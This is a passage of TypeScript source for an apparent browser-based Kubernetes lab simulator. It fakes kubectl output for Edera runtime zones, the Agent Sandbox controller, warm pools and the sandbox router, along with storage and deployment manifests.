    const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

    printHtml(
      `<span style="color:#00e5d4;"># SandboxSession(template="${templateName}", capabilities=${escapeHtml(
        JSON.stringify(Object.fromEntries(grants.map((grant) => [grant.provider, grant.capabilities]))),
      )}) →</span>`,
    );
    printPre(`<span style="color:#dff7f0;">${escapeHtml(generated)}</span>`);

    const [doc] = parseRuntimeManifest(generated);
    const created = createSandboxSession(doc, SANDBOX_SDK_PATH.slice(1));
    updateDashboard();
    if (!created) {
      printHtml(`<span style="color:#ff7373;">Traceback (most recent call last):
  File "examples/session.py", line 9, in &lt;module&gt;
edera_runtime.SessionError: the SandboxSession was rejected (see above)</span>`);
      return;
    }

    await wait(1200);
    const zone = protectZones.find((item) => item.name === sessionName && item.state === "ready");
    printHtml(
      `<span style="color:#a8cfca;">zone ${escapeHtml(zone?.uuid || sessionName)} ready on ${EDERA_SANDBOX_NODE}</span>`,
    );
    printHtml(
      `<span style="color:#b8ff3c;">[${escapeHtml(sessionName)}]</span> <span style="color:#dff7f0;">$ /readme-consume ${README_DIAL_REPO}</span>`,
    );
    printHtml(
      `<span style="color:#a8cfca;">  dialed ${README_CAPABILITY} from provider ${GITHUB_PROVIDER_NAME} · credentials: none in the sandbox · exit 0</span>`,
    );
    addEvent("Normal", "ExecInZone", `pod/${sessionName}`, `/readme-consume ${README_DIAL_REPO}`);

    await wait(2500);
    deleteCapabilityObject("SandboxSession", sessionName);
    printHtml(`<span style="color:#00e5d4;"># Leaving the with-block deleted the session and its zone.</span>`);
    updateDashboard();
    markDemoStepComplete("sdk-run");
  };

  const handleKubectlCommand = async (
    rawCmd: string,
    tokens: string[],
  ): Promise<boolean> => {
    if (tokens[0] !== "kubectl") {
      return false;
    }

    // ---------------------------------------------------------------------
    // Kubernetes Agent Sandbox + Edera walkthrough.
    // These are simulator-only resources layered on the existing Kubernetes
    // lab; the original pod/deployment/storage/Edera commands remain intact.
    // ---------------------------------------------------------------------
    if (handleCapabilityResources(tokens)) {
      return true;
    }

    if (handleEderaRuntimeResources(tokens)) {
      return true;
    }

    if (tokens[1] === "apply" && tokens[2] === "-f") {
      const requestedPath = tokens[3] || "";
      const normalizedRequestedPath = requestedPath.replace(/^['"]|['"]$/g, "");
      const releaseManifest =
        normalizedRequestedPath.includes("kubernetes-sigs/agent-sandbox/releases/download/") &&
        normalizedRequestedPath.endsWith("/manifest.yaml");

      if (releaseManifest) {
        const versionMatch = normalizedRequestedPath.match(
          /releases\/download\/([^/]+)\/manifest\.yaml$/,
        );
        agentSandboxVersion = versionMatch?.[1] || agentSandboxVersion;
        agentSandboxInstalled = true;
        agentSandboxControllerReady = true;
        addEvent(
          "Normal",
          "AgentSandboxInstalled",
          "agent-sandbox-system",
          `Agent Sandbox ${agentSandboxVersion} controller and v1beta1 CRDs installed`,
        );
        printHtml(
          `<span style="color:#b8ff3c;">Agent Sandbox ${escapeHtml(agentSandboxVersion)} installed successfully.</span>`,
        );
        printHtml(
          `<span style="color:#00e5d4;">Serving API: agents.x-k8s.io/v1beta1</span>`,
        );
        markDemoStepComplete("agent-sandbox-install");
        return true;
      }

      if (
        normalizedRequestedPath.includes("raw.githubusercontent.com/kubernetes-sigs/agent-sandbox/") &&
        normalizedRequestedPath.includes("sandbox_router.yaml")
      ) {
        agentSandboxRouterInstalled = true;
        addEvent(
          "Normal",
          "SandboxRouterInstalled",
          "service/sandbox-router-svc",
          "Sandbox Router installed for header-based sandbox routing",
        );
        printHtml(
          `<span style="color:#b8ff3c;">sandbox-router installed.</span>`,
        );
        markDemoStepComplete("agent-sandbox-router");
        return true;
      }

      if (normalizedRequestedPath.endsWith("agent-sandbox/sandbox.yaml")) {
        if (!agentSandboxInstalled) {
          printHtml(
            `<span style="color:#ff7373;">Error: install the Agent Sandbox controller first.</span>`,
          );
          return true;
        }
        if (!agentSandboxCreated) {
          agentSandboxCreated = true;
          agentSandboxReady = false;
          pods.push({
            name: "my-sandbox",
            namespace: "default",
            status: "Pending",
            age: "1s",
            image: "registry.k8s.io/agent-sandbox/python-runtime-sandbox:v0.1.0",
            ip: "<none>",
            node: "<none>",
            labels: { "agents.x-k8s.io/sandbox": "my-sandbox" },
            runtimeClassName: "edera",
          });
          addEvent(
            "Normal",
            "SandboxCreated",
            "sandbox/my-sandbox",
            "Sandbox created; controller is creating the long-running Edera-backed pod",
          );
          printHtml(
            `<span style="color:#b8ff3c;">sandbox.agents.x-k8s.io/my-sandbox created</span>`,
          );
        } else {
          printHtml(
            `<span style="color:#a8cfca;">sandbox.agents.x-k8s.io/my-sandbox unchanged</span>`,
          );
        }
        updateDashboard();
        markDemoStepComplete("agent-sandbox-apply");
        return true;
      }

      if (normalizedRequestedPath.endsWith("agent-sandbox/template-and-warm-pool.yaml")) {
        if (!agentSandboxInstalled) {
          printHtml(
            `<span style="color:#ff7373;">Error: install the Agent Sandbox controller first.</span>`,
          );
          return true;
        }
        agentSandboxTemplateCreated = true;
        agentSandboxWarmPoolCreated = true;
        const poolNames = ["python-sandbox-pool-a1b2c", "python-sandbox-pool-d3e4f"];
        for (const name of poolNames) {
          if (!pods.some((pod) => pod.name === name)) {
            pods.push({
              name,
              namespace: "default",
              status: "Running",
              age: "2s",
              image: "registry.k8s.io/agent-sandbox/python-runtime-sandbox:v0.1.0",
              ip: name.endsWith("a1b2c") ? "10.244.0.41" : "10.244.0.42",
              node: name.endsWith("a1b2c") ? "node-2" : "node-3",
              labels: { "agents.x-k8s.io/sandbox-template": "python-sandbox-edera-template" },
              runtimeClassName: "edera",
            });
          }
        }
        addEvent(
          "Normal",
          "WarmPoolReady",
          "sandboxwarmpool/python-sandbox-pool",
          "Two pre-warmed Python sandboxes are running with runtimeClassName=edera",
        );
        printHtml(
          `<span style="color:#b8ff3c;">sandboxtemplate/python-sandbox-edera-template created</span>`,
        );
        printHtml(
          `<span style="color:#b8ff3c;">sandboxwarmpool/python-sandbox-pool created (2 replicas)</span>`,
        );
        updateDashboard();
        markDemoStepComplete("agent-sandbox-warm-pool");
        return true;
      }
    }

    if (tokens[1] === "get") {
      const getArgs = tokens.slice(2);
      const getJoined = getArgs.join(" ");
      const requestedResource = (tokens[2] || "").toLowerCase();
      const isAllNamespaces =
        tokens.includes("-A") || tokens.includes("--all-namespaces");

      // `kubectl get pods -A` must use the pod renderer below, not the
      // daemonset table. Keep the common cluster pods in the simulator so
      // all-namespaces output reflects the same resources shown by the
      // namespace-specific pod view.
      if (
        ["pods", "pod"].includes(requestedResource) &&
        isAllNamespaces
      ) {
        ensureCoreClusterPods();
        // Fall through to the generic pod renderer below. This explicit
        // branch is intentionally non-returning: it prevents future
        // daemonset-specific handling from claiming `pods -A`.
      }

      if (
        ["daemonsets", "daemonset", "ds"].includes(requestedResource) &&
        isAllNamespaces
      ) {
        ensureCoreClusterPods();
        printPre(
          formatTerminalTable(
            [
              "NAMESPACE",
              "NAME",
              "DESIRED",
              "CURRENT",
              "READY",
              "UP-TO-DATE",
              "AVAILABLE",
              "NODE SELECTOR",
              "AGE",
            ],
            [
              [
                "kube-system", "kindnet", "3", "3", "3", "3", "3",
                "kubernetes.io/os=linux", "10m",
              ],
              [
                "kube-system", "kube-proxy", "3", "3", "3", "3", "3",
                "kubernetes.io/os=linux", "10m",
              ],
            ],
          ),
        );
        return true;
      }

      if (
        getJoined.includes("pods") &&
        tokens.includes("-n") &&
        tokens[tokens.indexOf("-n") + 1] === EDERA_RUNTIME_NAMESPACE
      ) {
        printPre(
          formatTerminalTable(
            ["NAME", "READY", "STATUS", "RESTARTS", "AGE"],
            [
              [{ text: "edera-runtime-controller-p656l", color: "#b8ff3c" }, "1/1", "Running", "0", "10m"],
            ],
          ),
        );
        return true;
      }

      if (getJoined.includes("crd") && getJoined.includes("sandboxes.agents.x-k8s.io")) {
        if (!agentSandboxInstalled) {
          printHtml(
            `<span style="color:#ff7373;">Error from server (NotFound): customresourcedefinitions.apiextensions.k8s.io "sandboxes.agents.x-k8s.io" not found</span>`,
          );
          return true;
        }
        printPre(
          formatTerminalTable(
            ["NAME", "CREATED AT"],
            [["sandboxes.agents.x-k8s.io", { text: "1m", color: "#b8ff3c" }]],
          ) +
            `\n\n<span style="color:#00e5d4;">v1beta1 served=true</span>`,
        );
        markDemoStepComplete("agent-sandbox-crd");
        return true;
      }

      if (getJoined.includes("runtimeclass") && getJoined.includes("edera")) {
        // Fall through to the existing RuntimeClass renderer.
      }

      if (getJoined.includes("sandboxtemplates,sandboxwarmpools,sandboxes,pods")) {
        printPre(
          formatTerminalTable(
            ["NAME", "TYPE"],
            [
              [{ text: "python-sandbox-edera-template", color: "#b8ff3c" }, "SandboxTemplate"],
              [{ text: "python-sandbox-pool", color: "#b8ff3c" }, "SandboxWarmPool"],
              [{ text: "my-sandbox", color: "#b8ff3c" }, "Sandbox"],
              [{ text: "python-sandbox-pool-a1b2c", color: "#b8ff3c" }, "Pod (edera)"],
              [{ text: "python-sandbox-pool-d3e4f", color: "#b8ff3c" }, "Pod (edera)"],
            ],
          ),
        );
        markDemoStepComplete("agent-sandbox-pool-list");
        return true;
      }

      if (getJoined.includes("sandbox,pods") || getJoined.includes("sandboxes,pods")) {
        if (!agentSandboxCreated) {
          printHtml(`<span style="color:#a8cfca;">No resources found.</span>`);
          return true;
        }
        const sandboxPod = pods.find((pod) => pod.name === "my-sandbox");
        printPre(
          formatTerminalTable(
            ["NAME", "READY", "RUNTIME", "STATUS", "KERNEL"],
            [[
              { text: "my-sandbox", color: "#b8ff3c" },
              agentSandboxReady ? "True" : "False",
              "edera",
              agentSandboxReady ? "Ready" : "Pending",
              agentSandboxReady ? "6.18.34-edera-zone" : "<pending>",
            ]],
          ) +
            `\n\n` +
            formatTerminalTable(
              ["POD", "STATUS", "RUNTIME", "NODE"],
              [[
                { text: sandboxPod?.name || "my-sandbox", color: "#b8ff3c" },
                sandboxPod?.status || "Pending",
                "edera",
                sandboxPod?.node || "<none>",
              ]],
            ),
        );
        markDemoStepComplete("agent-sandbox-inspect");
        return true;
      }

      if (getJoined.includes("sandboxtemplates") || getJoined.includes("sandboxwarmpools")) {
        if (agentSandboxWarmPoolCreated) {
          printPre(
            formatTerminalTable(
              ["NAME", "READY"],
              [
                [{ text: "python-sandbox-edera-template", color: "#b8ff3c" }, "True"],
                [{ text: "python-sandbox-pool", color: "#b8ff3c" }, "2/2"],
              ],
            ),
          );
          markDemoStepComplete("agent-sandbox-pool-list");
        } else {
          printHtml(`<span style="color:#a8cfca;">No resources found.</span>`);
        }
        return true;
      }

      if (getJoined.includes("sandbox") && !getJoined.includes("crd")) {
        if (!agentSandboxCreated) {
          printHtml(`<span style="color:#a8cfca;">No resources found.</span>`);
          return true;
        }
        printPre(
          formatTerminalTable(
            ["NAME", "READY", "AGE"],
            [[
              { text: "my-sandbox", color: "#b8ff3c" },
              agentSandboxReady ? "True" : "False",
              "1m",
            ]],
          ),
        );
        markDemoStepComplete("agent-sandbox-inspect");
        return true;
      }

      if (getJoined.includes("pods") && agentSandboxCreated && tokens.includes("-o") === false) {
        // Let the existing pod renderer handle normal `kubectl get pods` output.
      }
    }

    if (
      tokens[1] === "-n" &&
      tokens[2] === "agent-sandbox-system" &&
      tokens[3] === "rollout" &&
      tokens[4] === "status" &&
      tokens[5] === "deploy/agent-sandbox-controller"
    ) {
      if (!agentSandboxInstalled) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (NotFound): deployments.apps "agent-sandbox-controller" not found</span>`,
        );
        return true;
      }
      agentSandboxControllerReady = true;
      printHtml(
        `<span style="color:#b8ff3c;">deployment "agent-sandbox-controller" successfully rolled out</span>`,
      );
      markDemoStepComplete("agent-sandbox-controller");
      return true;
    }

    if (tokens[1] === "wait") {
      const sandboxTarget = tokens.find((token) => token.startsWith("sandbox/"));
      if (sandboxTarget === "sandbox/my-sandbox") {
        if (!agentSandboxCreated) {
          printHtml(`<span style="color:#ff7373;">Error from server (NotFound): sandbox "my-sandbox" not found</span>`);
          return true;
        }
        agentSandboxReady = true;
        const sandboxPod = pods.find((pod) => pod.name === "my-sandbox");
        if (sandboxPod) {
          sandboxPod.status = "Running";
          sandboxPod.node = "node-2";
          sandboxPod.ip = "10.244.0.31";
        }
        addEvent(
          "Normal",
          "SandboxReady",
          "sandbox/my-sandbox",
          "Agent Sandbox is Ready inside an Edera zone with a dedicated kernel",
        );
        printHtml(
          `<span style="color:#b8ff3c;">sandbox/my-sandbox condition met</span>`,
        );
        updateDashboard();
        markDemoStepComplete("agent-sandbox-ready");
        return true;
      }
    }

    if (tokens[1] === "exec") {
      // The terminal tokenizer intentionally keeps quoted arguments together,
      // but kubectl exec commonly appears in both forms:
      //   kubectl exec my-sandbox -- ...
      //   kubectl exec -it my-sandbox -- ...
      // Find the sandbox by name rather than assuming it is tokens[2].
      const podNameIndex = tokens.findIndex((token, index) => index >= 2 && token === "my-sandbox");
      const podName = podNameIndex >= 0 ? tokens[podNameIndex] : tokens[2];
      if (podName === "my-sandbox") {
        if (!agentSandboxReady) {
          printHtml(`<span style="color:#ff7373;">Error: sandbox "my-sandbox" is not Ready.</span>`);
          return true;
        }

        const commandIndex = tokens.indexOf("--");
        const execCommand =
          commandIndex >= 0
            ? tokens.slice(commandIndex + 1)
            : tokens.slice(podNameIndex >= 0 ? podNameIndex + 1 : 3);
        const commandText = execCommand.join(" ");

        if (/uname\s+-r/.test(commandText)) {
          printPre(`<span style="color:#b8ff3c;">6.18.34-edera-zone</span>`);
          addEvent("Normal", "SandboxKernelVerified", "sandbox/my-sandbox", "Sandbox reports its dedicated Edera zone kernel");
          markDemoStepComplete("agent-sandbox-kernel");
        } else if (/python3\s+-c/.test(commandText) && /2\s*\+\s*2/.test(commandText)) {
          printPre(`<span style="color:#b8ff3c;">4</span>`);
          addEvent("Normal", "SandboxCommandComplete", "sandbox/my-sandbox", "Python command executed inside the Edera-backed Agent Sandbox");
          markDemoStepComplete("agent-sandbox-exec");
        } else {
          printHtml(`<span style="color:#dff7f0;">Executed inside my-sandbox: ${escapeHtml(commandText || "<shell>")}</span>`);
        }
        return true;
      }
    }

    if (tokens[1] === "port-forward" && tokens[2] === "svc/sandbox-router-svc") {
      if (!agentSandboxRouterInstalled) {
        printHtml(`<span style="color:#ff7373;">Error: service "sandbox-router-svc" not found. Install the Sandbox Router first.</span>`);
        return true;
      }
      agentSandboxRouterForwarded = true;
      printHtml(`<span style="color:#b8ff3c;">Forwarding from 127.0.0.1:8080 -> 8080</span>`);
      printHtml(`<span style="color:#00e5d4;">Use X-Sandbox-ID and X-Sandbox-Port to address a sandbox.</span>`);
      markDemoStepComplete("agent-sandbox-api");
      if (/\bcurl\b.*localhost:8080\/execute/.test(rawCmd) && agentSandboxReady) {
        printPre(`<span style="color:#b8ff3c;">{\"stdout\":\"4\n\",\"stderr\":\"\",\"exit_code\":0}</span>`);
        addEvent(
          "Normal",
          "SandboxApiExecution",
          "sandbox/my-sandbox",
          "Router executed the Python command in the Edera-backed sandbox",
        );
      }
      return true;
    }

    if (tokens[1] === "delete" && tokens[2] === "sandbox" && tokens[3] === "my-sandbox") {
      const index = pods.findIndex((pod) => pod.name === "my-sandbox");
      if (index >= 0) pods.splice(index, 1);
      agentSandboxCreated = false;
      agentSandboxReady = false;
      addEvent("Normal", "SandboxDeleted", "sandbox/my-sandbox", "Agent Sandbox deleted");
      printHtml(`<span style="color:#b8ff3c;">sandbox.agents.x-k8s.io/my-sandbox deleted</span>`);
      updateDashboard();
      markDemoStepComplete("agent-sandbox-cleanup");
      return true;
    }
    if (tokens[1] === "run") {
      const podName = tokens[2];

      if (!podName || podName.startsWith("-")) {
        printHtml(
          `<span style="color:#ff7373;">Error: pod name required.</span>`,
        );
        return true;
      }

      let imageName = podName;
      let targetNamespace = "default";

      const customLabels: Record<string, string> = {
        run: podName,
      };

      for (let i = 3; i < tokens.length; i++) {
        const arg = tokens[i];

        if (arg.startsWith("--image=")) {
          imageName = arg.split("=")[1] || imageName;
        } else if (arg === "--image") {
          imageName = tokens[++i] || imageName;
        } else if (arg === "-n" || arg === "--namespace") {
          targetNamespace = tokens[++i] || targetNamespace;
        } else if (arg.startsWith("--namespace=")) {
          targetNamespace =
            arg.split("=")[1] || targetNamespace;
        } else if (arg.startsWith("--labels=")) {
          const rawLabels = arg
            .replace("--labels=", "")
            .replace(/["']/g, "");

          rawLabels.split(",").forEach((pair) => {
            const [key, value] = pair.split("=");

            if (key) {
              customLabels[key.trim()] = value?.trim() || "";
            }
          });
        }
      }

      if (
        !namespaces.some(
          (namespace) => namespace.name === targetNamespace,
        )
      ) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (NotFound): namespaces "${escapeHtml(
            targetNamespace,
          )}" not found</span>`,
        );
        return true;
      }

      if (
        pods.some(
          (pod) =>
            pod.name === podName &&
            pod.namespace === targetNamespace,
        )
      ) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (AlreadyExists): pods "${escapeHtml(
            podName,
          )}" already exists</span>`,
        );
        return true;
      }

      const pod: LocalPod = {
        name: podName,
        namespace: targetNamespace,
        status: "Pending",
        age: "1s",
        image: imageName,
        ip: "<none>",
        node: "<none>",
        labels: customLabels,
      };

      pods.push(pod);

      addEvent(
        "Normal",
        "Created",
        `pod/${podName}`,
        `pod/${podName} created in namespace ${targetNamespace}`,
      );

      checkPendingPods();
      updateDashboard();

      printHtml(
        `<span style="color:#b8ff3c;">pod/${escapeHtml(
          podName,
        )} created</span>`,
      );

      return true;
    }
    if (
      tokens[1] === "create" &&
      (tokens[2] === "namespace" ||
        tokens[2] === "ns")
    ) {
      const namespaceName = tokens[3];

      if (!namespaceName) {
        printHtml(
          `<span style="color:#ff7373;">Error: namespace name required.</span>`,
        );
        return true;
      }

      if (
        namespaces.some(
          (namespace) => namespace.name === namespaceName,
        )
      ) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (AlreadyExists): namespaces "${escapeHtml(
            namespaceName,
          )}" already exists</span>`,
        );
        return true;
      }

      namespaces.push({
        name: namespaceName,
        status: "Active",
        age: "1s",
      });

      addEvent(
        "Normal",
        "Created",
        `namespace/${namespaceName}`,
        `namespace/${namespaceName} created`,
      );

      printHtml(
        `<span style="color:#b8ff3c;">namespace/${escapeHtml(
          namespaceName,
        )} created</span>`,
      );

      return true;
    }
    if (tokens[1] === "apply" && tokens[2] === "-f") {
      const requestedPath = tokens[3];
      const manifestPath = requestedPath ? resolveVirtualPath(requestedPath) : "";
      const fileName = manifestPath ? virtualBasename(manifestPath) : "";

      if (!requestedPath || !getVirtualFile(manifestPath)) {
        printHtml(
          `<span style="color:#ff7373;">error: the path "${escapeHtml(
            requestedPath || "",
          )}" does not exist</span>`,
        );
        return true;
      }

      // Kubernetes requires namespaced resources to be created in an existing
      // namespace. Validate that before simulating creation so an apply of a
      // manifest with `metadata.namespace` cannot report a misleading
      // successful create. Cluster-scoped resources do not require this check.
      const manifestKind = getManifestKind(manifestPath);
      const clusterScopedKinds = new Set([
        "Namespace",
        "Node",
        "PersistentVolume",
        "RuntimeClass",
        "StorageClass",
        "ClusterRole",
        "ClusterRoleBinding",
        "CustomResourceDefinition",
      ]);
      if (!clusterScopedKinds.has(manifestKind)) {
        const manifestNamespace = requireManifestNamespace(manifestPath);
        if (!manifestNamespace) {
          return true;
        }
      }

      if (fileName === "csi-block-pvc.yaml" || fileName === "filesystem-pvc.yaml") {
        const volumeMode = fileName === "csi-block-pvc.yaml" ? "Block" : "Filesystem" as const;
        const existing = persistentVolumeClaims.find((item) => item.name === "my-app-data");
        if (existing) {
          printHtml(`<span style="color:#a8cfca;">persistentvolumeclaim/my-app-data unchanged</span>`);
          return true;
        }
        const pvName = volumeMode === "Block" ? "pvc-${my-app-data}" : "pvc-${my-app-data}";
        persistentVolumes.push({ name: pvName, status: "Available", capacity: "10Gi", accessModes: "RWO", volumeMode, storageClassName: "gp3", source: "CSI", formatted: volumeMode === "Filesystem" });
        persistentVolumeClaims.push({ name: "my-app-data", namespace: "default", status: "Pending", volumeName: pvName, capacity: "10Gi", accessModes: "RWO", volumeMode, storageClassName: "gp3", formatted: volumeMode === "Filesystem" });
        bindStorage();
        addEvent("Normal", "Created", "persistentvolumeclaim/my-app-data", `persistentvolumeclaim/my-app-data created (${volumeMode})`);
        printHtml(`<span style="color:#b8ff3c;">persistentvolumeclaim/my-app-data created and ${volumeMode === "Block" ? "awaiting formatting" : "bound with a filesystem"}</span>`);
        return true;
      }

      if (fileName === "format-block-device.yaml") {
        const existing = jobs.find((job) => job.name === "format-block-device");
        if (existing) {
          printHtml(`<span style="color:#a8cfca;">job.batch/format-block-device already exists</span>`);
          return true;
        }
        const pvc = persistentVolumeClaims.find((item) => item.name === "my-app-data");
        if (!pvc || pvc.volumeMode !== "Block" || pvc.status !== "Bound") {
          printHtml(`<span style="color:#ff7373;">Error: PersistentVolumeClaim "my-app-data" must be a bound Block volume before the formatter Job can run.</span>`);
          return true;
        }
        const job: LocalJob = { name: "format-block-device", namespace: "default", completions: 1, succeeded: 0, status: "Running", image: "alpine:latest", targetDevice: "/dev/data", claimName: pvc.name };
        jobs.push(job);
        addEvent("Normal", "Created", "job/format-block-device", "formatter Job created using the default container runtime");
        printHtml(`<span style="color:#b8ff3c;">job.batch/format-block-device created</span>`);
        return true;
      }

      if (fileName === "local-nvme-pv.yaml") {
        if (persistentVolumes.some((item) => item.name === "local-raw-pv")) {
          printHtml(`<span style="color:#a8cfca;">persistentvolume/local-raw-pv unchanged</span>`);
          return true;
        }
        persistentVolumes.push({ name: "local-raw-pv", status: "Available", capacity: "5Gi", accessModes: "RWO", volumeMode: "Block", source: "Local", devicePath: "/dev/nvme0n1", nodeAffinity: "kubernetes.io/hostname=my-host", formatted: true });
        addEvent("Normal", "Created", "persistentvolume/local-raw-pv", "local PersistentVolume created for /dev/nvme0n1");
        printHtml(`<span style="color:#b8ff3c;">persistentvolume/local-raw-pv created</span>`);
        return true;
      }

      if (fileName === "local-nvme-pvc.yaml") {
        if (persistentVolumeClaims.some((item) => item.name === "local-block-pvc")) {
          printHtml(`<span style="color:#a8cfca;">persistentvolumeclaim/local-block-pvc unchanged</span>`);
          return true;
        }
        persistentVolumeClaims.push({ name: "local-block-pvc", namespace: "default", status: "Pending", volumeName: "local-raw-pv", capacity: "5Gi", accessModes: "RWO", volumeMode: "Block", formatted: true });
        bindStorage();
        printHtml(`<span style="color:#b8ff3c;">persistentvolumeclaim/local-block-pvc created</span>`);
        return true;
      }

      if (fileName === "csi-block-deployment.yaml" || fileName === "filesystem-deployment.yaml" || fileName === "local-nvme-deployment.yaml") {
        const deploymentName = "my-app";
        const manifestNamespace = getManifestNamespace(manifestPath);
        const existing = deployments.find((deployment) => deployment.name === deploymentName && deployment.namespace === manifestNamespace);
        if (existing) {
          printHtml(`<span style="color:#a8cfca;">deployment.apps/${deploymentName} unchanged</span>`);
          return true;
        }
        const isLocal = fileName === "local-nvme-deployment.yaml";
        const isBlock = fileName !== "filesystem-deployment.yaml";
        const claimName = isLocal ? "local-block-pvc" : "my-app-data";
        const deployment: LocalDeployment = {
          name: deploymentName, namespace: manifestNamespace, replicas: 1, readyReplicas: 0, image: "my-app:latest", runtimeClassName: "edera", selector: "app=my-app",
          nodeSelector: isLocal ? { "kubernetes.io/hostname": "my-host" } : undefined, volumeClaimName: claimName, volumeMode: isBlock ? "Block" : "Filesystem", volumeTargetPath: isBlock ? (isLocal ? "/mnt/high-perf-storage" : "/var/lib/my-app/data") : "/var/lib/my-app/data",
        };
        deployments.push(deployment);
        const pod: LocalPod = { name: "my-app-00001", namespace: manifestNamespace, status: "Pending", age: "1s", image: deployment.image, ip: "<none>", node: "<none>", labels: { app: "my-app" }, runtimeClassName: "edera", ownerDeployment: deploymentName, nodeSelector: deployment.nodeSelector };
        pods.push(pod);
        bindStorage();
        const storageReady = storageReadyForDeployment(claimName, deployment.volumeMode!);
        if (!storageReady) {
          addEvent("Warning", "VolumeNotReady", `pod/${pod.name}`, isBlock ? `Waiting for block volume ${claimName} to be formatted before mounting ${deployment.volumeTargetPath}` : `Waiting for PersistentVolumeClaim ${claimName} to become bound`);
        }
        addEvent("Normal", "Created", `deployment/${deploymentName}`, `deployment.apps/${deploymentName} created with ${deployment.volumeMode} storage`);
        checkPendingPods();
        deployment.readyReplicas = pods.filter((item) => item.ownerDeployment === deploymentName && item.status === "Running").length;
        updateDashboard();
        printHtml(`<span style="color:#b8ff3c;">deployment.apps/${deploymentName} created</span>`);
        return true;
      }

      if (fileName === "nginx-deployment.yaml") {
        const deploymentName = "nginx";
        const manifestNamespace = requireManifestNamespace(manifestPath);
        if (!manifestNamespace) {
          return true;
        }
        const runtimeReady = activeRuntimeClasses.has("edera");
        const existing = deployments.find((deployment) => deployment.name === deploymentName);

        if (existing) {
          printHtml(`<span style="color:#a8cfca;">deployment.apps/${deploymentName} unchanged</span>`);
          return true;
        }

        const deployment: LocalDeployment = {
          name: deploymentName,
          namespace: manifestNamespace,
          replicas: 2,
          readyReplicas: 0,
          image: "nginx:1.14.2",
          runtimeClassName: "edera",
          selector: "app=nginx",
        };
        deployments.push(deployment);

        for (let i = 1; i <= deployment.replicas; i++) {
          const podName = `${deploymentName}-${String(i).padStart(5, "0")}`;
          pods.push({
            name: podName,
            namespace: manifestNamespace,
            status: "Pending",
            age: "1s",
            image: deployment.image,
            ip: "<none>",
            node: "<none>",
            labels: { app: "nginx" },
            runtimeClassName: "edera",
            ownerDeployment: deploymentName,
          });
        }

        addEvent("Normal", "Created", `deployment/${deploymentName}`, `deployment.apps/${deploymentName} created`);
        if (!runtimeReady) {
          addEvent("Warning", "ReplicaSetCreate", `deployment/${deploymentName}`, `Created ${deployment.replicas} Pending pods waiting for RuntimeClass "edera"`);
        }
        checkPendingPods();
        deployment.readyReplicas = pods.filter((pod) => pod.ownerDeployment === deploymentName && pod.status === "Running").length;

        updateDashboard();
        printHtml(`<span style="color:#b8ff3c;">deployment.apps/${deploymentName} created</span>`);
        markDemoStepComplete("deployment-apply");
        return true;
      }

      if (fileName === "pod-nginx.yaml") {
        const podName = "edera-protect-pod";
        const manifestNamespace = requireManifestNamespace(manifestPath);
        if (!manifestNamespace) {
          return true;
        }
        const runtimeReady = activeRuntimeClasses.has("edera");

        const existingPod = pods.find(
          (pod) =>
            pod.name === podName &&
            pod.namespace === manifestNamespace,
        );

        if (existingPod) {
          if (existingPod.status === "Failed" && runtimeReady) {
            existingPod.status = "Pending";
            existingPod.node = "<none>";
            existingPod.ip = "<none>";
            checkPendingPods();
            syncEderaPodsToProtectWorkloads();
            updateDashboard();
            printHtml(
              `<span style="color:#b8ff3c;">pod/${escapeHtml(podName)} re-applied and recovered</span>`,
            );
          } else {
            printHtml(
              `<span style="color:#a8cfca;">pod/${escapeHtml(podName)} unchanged</span>`,
            );
          }
          markDemoStepComplete("edera-pod-apply");
          return true;
        }

        pods.push({
          name: podName,
          namespace: manifestNamespace,
          status: "Pending",
          age: "1s",
          image: "nginx",
          ip: "<none>",
          node: "<none>",
          labels: { env: "test" },
          runtimeClassName: "edera",
        });

        addEvent(
          "Normal",
          "Created",
          `pod/${podName}`,
          `pod/${podName} created from manifest`,
        );

        if (!runtimeReady) {
          addEvent(
            "Warning",
            "FailedCreatePodSandBox",
            `pod/${podName}`,
            `Failed to create pod sandbox: RuntimeClass "edera" not found`,
          );
        }

        checkPendingPods();
        updateDashboard();

        printHtml(
          `<span style="color:#b8ff3c;">pod/${podName} created</span>`,
        );

        markDemoStepComplete("edera-pod-apply");
        return true;
      }

      if (fileName === "csi-block-pvc.yaml" || fileName === "filesystem-pvc.yaml") {
        const pvcName = "my-app-data";
        const pvcIndex = persistentVolumeClaims.findIndex((item) => item.name === pvcName);
        if (pvcIndex < 0) { printHtml(`<span style="color:#a8cfca;">persistentvolumeclaim/${pvcName} not found</span>`); return true; }
        const pvc = persistentVolumeClaims[pvcIndex];
        persistentVolumeClaims.splice(pvcIndex, 1);
        persistentVolumes = persistentVolumes.filter((pv) => pv.claimName !== `default/${pvcName}` && pv.name !== pvc.volumeName);
        addEvent("Normal", "Deleted", `persistentvolumeclaim/${pvcName}`, `persistentvolumeclaim/${pvcName} deleted`);
        updateDashboard(); printHtml(`<span style="color:#b8ff3c;">persistentvolumeclaim/${pvcName} deleted</span>`); return true;
      }

      if (fileName === "format-block-device.yaml") {
        const index = jobs.findIndex((job) => job.name === "format-block-device");
        if (index < 0) { printHtml(`<span style="color:#a8cfca;">job.batch/format-block-device not found</span>`); return true; }
        jobs.splice(index, 1); addEvent("Normal", "Deleted", "job/format-block-device", "Job format-block-device deleted"); updateDashboard(); printHtml(`<span style="color:#b8ff3c;">job.batch/format-block-device deleted</span>`); return true;
      }

      if (fileName === "local-nvme-pv.yaml") {
        persistentVolumes = persistentVolumes.filter((pv) => pv.name !== "local-raw-pv"); updateDashboard(); printHtml(`<span style="color:#b8ff3c;">persistentvolume/local-raw-pv deleted</span>`); return true;
      }

      if (fileName === "local-nvme-pvc.yaml") {
        persistentVolumeClaims = persistentVolumeClaims.filter((pvc) => pvc.name !== "local-block-pvc"); persistentVolumes = persistentVolumes.filter((pv) => pv.name !== "local-raw-pv"); updateDashboard(); printHtml(`<span style="color:#b8ff3c;">persistentvolumeclaim/local-block-pvc deleted</span>`); return true;
      }

      if (fileName === "csi-block-deployment.yaml" || fileName === "filesystem-deployment.yaml" || fileName === "local-nvme-deployment.yaml") {
        const ownedPods = pods.filter((pod) => pod.ownerDeployment === "my-app");
        pods = pods.filter((pod) => pod.ownerDeployment !== "my-app");
        deployments = deployments.filter((deployment) => deployment.name !== "my-app");
        protectWorkloads = protectWorkloads.filter((workload) => !ownedPods.some((pod) => pod.name === workload.sourcePodName));
